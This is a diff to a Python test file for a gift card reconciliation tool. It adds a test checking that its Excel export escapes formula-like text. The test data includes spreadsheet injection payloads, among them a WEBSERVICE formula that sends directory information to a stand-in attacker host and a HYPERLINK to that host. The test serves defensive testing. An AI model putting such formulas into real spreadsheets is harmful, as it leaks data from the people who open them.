@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+from dataclasses import replace
 from decimal import Decimal
 from pathlib import Path
 
@@ -8,6 +9,7 @@ from openpyxl import Workbook, load_workbook
 from gift_card_recon.cli import main
 import pytest
 
+from gift_card_recon.excel_writer import write_reconciliation_workbook
 from gift_card_recon.parsers import ParseError, discover_input_files, parse_activity_file, parse_pos_controls, parse_summary
 from gift_card_recon.reconcile import build_reconciliation
 from gift_card_recon.utils import parse_date
@@ -119,6 +121,42 @@ def test_weekly_reconciliation_with_optional_summary(tmp_path: Path):
     assert result.lines[0].activity_variance == Decimal("0.00")
     assert result.lines[2].pos_variance == Decimal("132.73")
 
+
+def test_exported_workbook_escapes_formula_like_activity_text(tmp_path: Path):
+    input_dir = tmp_path / "input" / "9354" / "2026-W22"
+    activity_dir = input_dir / "activity"
+    activity_dir.mkdir(parents=True)
+    activity_path = activity_dir / WEEKLY[0][0]
+    create_activity(activity_path, *WEEKLY[0][1:])
+    pos = parse_pos_controls_from_values("9354", "2026-W22", "2730.00", "7446.47")
+    activity = parse_activity_file(activity_path, set())
+    result = build_reconciliation(
+        store="9354",
+        period="2026-W22",
+        period_end=parse_date("2026-05-03"),
+        summary=None,
+        activities=[activity],
+        pos_controls=pos,
+        mode="weekly",
+    )
+    payload = '=WEBSERVICE("https://attacker.example/?d="&INFO("DIRECTORY"))'
+    malicious_row = replace(
+        result.raw_rows[0],
+        card_no=payload,
+        request="+SUM(1,1)",
+        request_code_listing='\t@HYPERLINK("https://attacker.example")',
+    )
+    result = replace(result, raw_rows=[malicious_row, *result.raw_rows[1:]])
+
+    output_path = tmp_path / "escaped.xlsx"
+    write_reconciliation_workbook(result, output_path)
+
+    exported = load_workbook(output_path, data_only=False)
+    raw = exported["Raw Detail"]
+    assert raw["B4"].value == f"'{payload}"
+    assert raw["B4"].data_type == "s"
+    assert raw["C4"].value == "'+SUM(1,1)"
+    assert raw["D4"].value == "'\t@HYPERLINK(\"https://attacker.example\")"
 
 def test_monthly_mode_still_requires_summary(tmp_path: Path):
     input_dir = tmp_path / "input" / "9354" / "2026-05"
